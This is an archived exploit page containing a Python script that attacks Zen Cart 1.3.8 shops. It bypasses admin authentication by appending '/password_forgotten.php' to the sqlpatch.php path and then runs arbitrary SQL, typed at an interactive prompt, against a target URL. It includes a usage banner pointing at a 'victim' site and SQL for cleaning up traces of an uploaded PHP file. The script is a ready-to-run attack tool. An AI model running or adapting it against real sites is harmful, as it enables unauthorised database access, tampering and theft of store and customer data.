<html><head><title>Zen Cart 1.3.8 Remote SQL Execution Exploit</title></head><pre>#!/usr/bin/python

#
# ------- Zen Cart 1.3.8 Remote SQL Execution
# http://www.zen-cart.com/
# Zen Cart Ecommerce - putting the dream of server rooting within reach of anyone!
# A new version (1.3.8a) is avaible on http://www.zen-cart.com/
#
# BlackH :)
#

#
# Notes: must have admin/sqlpatch.php enabled
#
# clean the database :
#	DELETE FROM `record_company_info` WHERE `record_company_id` = (SELECT `record_company_id` FROM `record_company` WHERE `record_company_image` = '8d317.php' LIMIT 1);
#	DELETE FROM `record_company` WHERE `record_company_image` = '8d317.php';

import urllib, urllib2, re, sys

a,b = sys.argv,0

def option(name, need = 0):
	global a, b
	for param in sys.argv:
		if(param == '-'+name): return str(sys.argv[b+1])
		b = b + 1
	if(need):
		print '\n#error', &quot;-&quot;+name, 'parameter required'
		exit(1)

if (len(sys.argv) &lt; 2):
	print &quot;&quot;&quot;
=____________ Zen Cart 1.3.8 Remote SQL Execution Exploit  ____________=
========================================================================
|                  BlackH &lt;Bl4ck.H@gmail.com&gt;                          |
========================================================================
|                                                                      |
| $system&gt; python &quot;&quot;&quot;+sys.argv[0]+&quot;&quot;&quot; -url &lt;url&gt;                                 |
| Param: &lt;url&gt;      ex: http://victim.com/site (no slash)              |
|                                                                      |
| Note: blind &quot;injection&quot;                                              |
========================================================================
	&quot;&quot;&quot;
	exit(1)
	
url, trick = option('url', 1), &quot;/password_forgotten.php&quot;

while True:
	cmd = raw_input('sql@jah$ ') 
	if (cmd == &quot;exit&quot;): exit(1)
	req = urllib2.Request(url+&quot;/admin/sqlpatch.php&quot;+trick+&quot;?action=execute&quot;, urllib.urlencode({'query_string' : cmd}))
	if (re.findall('1 statements processed',urllib2.urlopen(req).read())):
		print '&gt;&gt; success (', cmd, &quot;)&quot;
	else:
		print '&gt;&gt; failed, be sure to end with ; (', cmd, &quot;)&quot;

# milw0rm.com [2009-06-23]</pre></html>